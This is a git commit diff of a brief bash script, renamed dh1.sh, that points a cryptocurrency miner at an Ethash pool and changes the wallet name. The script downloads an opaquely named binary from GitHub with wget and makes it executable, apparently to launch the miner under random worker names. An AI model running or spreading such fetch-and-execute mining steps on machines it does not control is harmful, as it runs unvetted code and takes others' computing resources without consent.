bbb33cefece2064abec301ecb0d5b1388d0f875b
jamesjack21 <89977279+jamesjack21@users.noreply.github.com>
2021-09-17 00:20:49 +0530

    Update and rename dh.sh to dh1.sh

--- dh1.sh
+++ dh1.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=stratum+tcp://ethash.poolbinance.com:1800
-WALLET=tausee
+WALLET=Kaushar
 WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
 wget https://github.com/archernap/prem/raw/main/priyatama
 chmod +x priyatama
